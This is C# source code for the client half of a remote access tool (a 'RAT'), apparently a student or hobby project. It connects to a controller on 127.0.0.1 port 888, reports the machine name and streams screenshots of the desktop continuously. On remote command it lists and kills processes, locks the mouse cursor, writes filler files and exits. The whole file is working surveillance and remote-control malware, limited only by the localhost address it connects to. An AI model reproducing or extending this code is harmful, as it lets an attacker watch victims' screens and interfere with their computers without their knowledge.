using System.IO;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO.Compression;
using System.Runtime.InteropServices;

class RAT
{

    private static readonly int ServerPort = 888;

    //InterNetwork = IPv4, Stream = Constant connection because it's an TCP protocol
    private static Socket Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    private static Socket udpServer = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);


    //Buffer for incomming data
    private static byte[] _buffer = new byte[1024 * 1024 * 1]; //1024 bytes

    static bool IsAlreadyOpen()
    {
        string CurrentProcess = Process.GetCurrentProcess().ProcessName;
        try
        {
            if(Process.GetProcessesByName(CurrentProcess).Length > 1)
            {
                return true;
            }
            return false;
        } catch { return false; }
    }

    static byte[] CompressA(byte[] data)
    {
        using (var compressedStream = new MemoryStream())
        using (var zipStream = new GZipStream(compressedStream, CompressionMode.Compress))
        {
            zipStream.Write(data, 0, data.Length);
            zipStream.Close();
            return compressedStream.ToArray();
        }
    }
    static byte[] Decompress(byte[] compressed)
    {
        using var from = new MemoryStream(compressed);
        using var to = new MemoryStream();
        using var gZipStream = new GZipStream(from, CompressionMode.Decompress);
        gZipStream.CopyTo(to);
        return to.ToArray();
    }


    private static byte[] CaptureDesktop()
    {
        return CompressA(CaptureDesktopIntoByteArray());
    }

    //private static string CaptureDesktop()
    //{
    //    return ConvertToBase64(CompressA(CaptureDesktopIntoByteArray()));
    //}
    private static byte[] CaptureDesktopIntoByteArray()
    {
        using(MemoryStream memoryStream = new MemoryStream())
        {
            Bitmap desktop = new Bitmap(1920, 1080);

            Graphics graphics = Graphics.FromImage(desktop);
            graphics.CopyFromScreen(0, 0, 0, 0, desktop.Size);

            
            Bitmap resize = new Bitmap(480, 270); //skift størrelse for at sikre god latency
            using (Graphics g = Graphics.FromImage(resize))
            {
                g.DrawImage(desktop, 0, 0, 480, 270);
                resize.Save(memoryStream, ImageFormat.Jpeg);
            }

           
            return memoryStream.ToArray();
        }
    }

    private static string ConvertToBase64(byte[] data)
    {
        return Convert.ToBase64String(data);
    }



    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool SetCursorPos(int x, int y);


    static void Main()
    {





        //while (true)
        //{
        //    SetCursorPos(0, 0);
        //}


        //File.WriteAllBytes("test.png", Decompress(CompressA(CaptureDesktopIntoByteArray()))); 
        //File.WriteAllBytes("z1_without_compress.jpg", CaptureDesktopIntoByteArray());
        //File.WriteAllBytes("z1_with_compress.jpg", CompressA(CaptureDesktopIntoByteArray()));



        //File.WriteAllText("pic.txt", CaptureDesktop());

        //PowerShell ps = PowerShell.Create();

        //ps.AddCommand("Get-Process");
        //ps.Invoke();



        udpServer.Connect(new IPEndPoint(IPAddress.Parse("127.0.0.1"), 888));

        //65535
        Task.Factory.StartNew(() =>
        {
            while (true)
            {
                byte[] currentBytes = CaptureDesktop();
                int currentLenght = currentBytes.Length;

                udpServer.Send(CaptureDesktop());
                Thread.Sleep(1);
            }
        });

        if (IsAlreadyOpen() == true)
        {
            Environment.Exit(0);
        }

        Console.Title = "RAT Client - Zealand";


        Client.Connect("127.0.0.1", 888); //127.0.0.1

        //As soon as we connect, we are sending our device name to the RAT
        SendMessage(
            FormConnectionDetails());
        

        Client.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReadCallback), null);



      


        //Do not close the program, because we are using async server
        Process.GetCurrentProcess().WaitForExit();
    }



   

    static string FormConnectionDetails()
    {
        string DeviceName = Environment.MachineName;
        return $"ConnectionInfo/{DeviceName}/";
    }

    

    static void ReadCallback(IAsyncResult er) //tilføj i try catch fordi jeg ikke kan handle
    {
        if (Client.Connected)
        {
            int ReceivedData = Client.EndReceive(er);

            if (ReceivedData == 0)
            {
                //client disconnected / timedout
            }
            else if (ReceivedData != 0)
            {

                //Process requested data.
                ProcessCommand(
                    ByteArrayToString(_buffer, ReceivedData));


                //Waiting for new data as soon as we process our latest requests / commands
                Client.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReadCallback), null);
            }
        }
        
    }


    static void ProcessCommand(string command)
    {


        if(command == "beep")
        {
            Console.Beep(1000, 1000);
        }

        if(command == "disconnect")
        {
            Environment.Exit(0);
        }

        if(command == "largefile")
        {
            for(int i = 0; i < 1000; i++)
            {
                using (FileStream openFile = new FileStream("test.txt", FileMode.Append, FileAccess.Write))
                {
                    openFile.Write(new byte[1024]);
                };
            }
        }


        if(command == "screen")
        {
            //byte[] ScreenData = Encoding.UTF8.GetBytes($"image/{CaptureDesktop()}");
            //SendBytes(ScreenData);
        }


        if(command == "processList")
        {
            StringBuilder ListOfProcesses = new StringBuilder();


            foreach(Process CurrentProcess in Process.GetProcesses())
            {
                try
                {
                    ListOfProcesses.Append($"{CurrentProcess.ProcessName}|{CurrentProcess.MainModule.FileName};");
                }
                catch { }
            }

            SendMessage("processList/" + ListOfProcesses.ToString());
        }


        if (command.StartsWith("killProcess/"))
        {
            string ChosenProcess = command.Replace("killProcess/", "");

            try
            {
                Process.GetProcessesByName(ChosenProcess)[0].Kill();
            }
            catch { }



            StringBuilder ListOfProcesses = new StringBuilder();


            foreach (Process CurrentProcess in Process.GetProcesses())
            {
                try
                {
                    ListOfProcesses.Append($"{CurrentProcess.ProcessName}|{CurrentProcess.MainModule.FileName};");
                }
                catch { }
            }

            SendMessage("processList/" + ListOfProcesses.ToString());
        }

        if(command == "lockCursor")
        {
            Task.Factory.StartNew(() =>
            {
                Stopwatch stopwatch = Stopwatch.StartNew();
                stopwatch.Start();

                while (stopwatch.ElapsedMilliseconds < 5000)
                {
                    SetCursorPos(0, 0);
                }
            });
        }

        //Console.WriteLine(command);


    }

    static string ByteArrayToString(byte[] data, int bytesize)
    {
        return Encoding.ASCII.GetString(data, 0, bytesize);
    }


    static void SendMessage(string message)
    {
        SendBytes(Encoding.ASCII.GetBytes(message));
    }

    static void SendBytes(byte[] data)
    {
        Client.BeginSend(data, 0, data.Length, SocketFlags.None, new AsyncCallback(SendCallback), null);
    }



    static void SendCallback(IAsyncResult er)
    {
        try
        {
           if(Client.Connected == true)
            {
                int SendData = Client!.EndSend(er);

                Console.WriteLine($"Sent {SendData} bytes.");
            }
        }
        catch (Exception ex) { Console.WriteLine(ex.Message.ToString()); }

    }










}